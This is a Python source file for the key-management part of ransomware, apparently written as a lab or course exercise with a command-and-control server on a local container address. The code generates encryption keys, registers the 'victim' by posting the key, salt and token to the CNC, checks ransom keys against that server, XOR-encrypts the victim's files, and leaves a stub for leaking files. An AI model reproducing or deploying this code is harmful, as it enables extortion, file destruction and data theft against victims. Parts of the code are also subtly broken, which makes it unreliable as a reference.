from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # derive de salt
        sdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.SALT_LENGTH,
            salt=secrets.token_bytes(self.TOKEN_LENGTH),
            iterations=self.ITERATION,
        )
        salt=sdf.derive(salt)

        #derive de key
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
        )
        key=kdf.derive(key)
        return key, salt


    def create(self)->Tuple[bytes, bytes, bytes]:
        #the function that creates a random byte strings for the key, salt and token with their
        # cste number of bytes respectively
        new = (secrets.token_bytes(self.KEY_LENGTH), 
                secrets.token_bytes(self.SALT_LENGTH),
                secrets.token_bytes(self.TOKEN_LENGTH))
        return new


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        elt = {
            "salt"  : self.bin_to_b64(salt),
            "key"   : self.bin_to_b64(key),
            "token" : self.bin_to_b64(token),
            }
        #sending the new encrypting elements to cnc by the URL /new
        requests.post("http://172.18.0.2:6666/new", json=elt) 

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        tokens = self.create() #creating tokens -> Tuple (salt, key, token) 

        self._key, self._salt = self.do_derivation(tokens[1], tokens[0]) #deriving the key and the salt to keep them
        self._token = tokens[2] 

        path_token = "/root/token" 
        os.makedirs(path_token, exist_ok=True) #creating the directory token in the target's root
        with open(path_token + "/token.bin", "wb") as f:    #with the token
            f.write(self._token)    
        with open(path_token + "/salt.bin", "wb") as f:     #and with the salt
            f.write(self._salt)

        self.post_new(self._salt, self._key, self._token)

    def load(self)->None:
        # function to load crypto data
        salt=self._salt
        token=self._token

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        token = self.get_hex_token()
        payload = {
            "token": token, 
            "key": self.bin_to_b64(candidate_key)
            }
        #sending the json with token and the key to cnc to the URL /key by POST method
        response = requests.post("http://172.18.0.2:6666/key", json=payload)
        reponse= response.json() # receiving the output of the post_key with a json {'valide': int}
        
        #verifing is the key matches with the key in the cnc
        if (reponse.get("valide")==1):
            return True
        else:
            return False

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        key=base64.b64decode(b64_key)
        if self.check_key(key):
            self._key=key
        else:
            raise NameError('The Wrong Key') # raisning the error if the received key doesn't match

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        token = ""
        
        with open("/root/token/token.bin", "rb") as f:
            token = f.read()
        
        res=token.hex()
        return res

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for file in files:
            file = xorfile(file, self._key)

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        self._key=None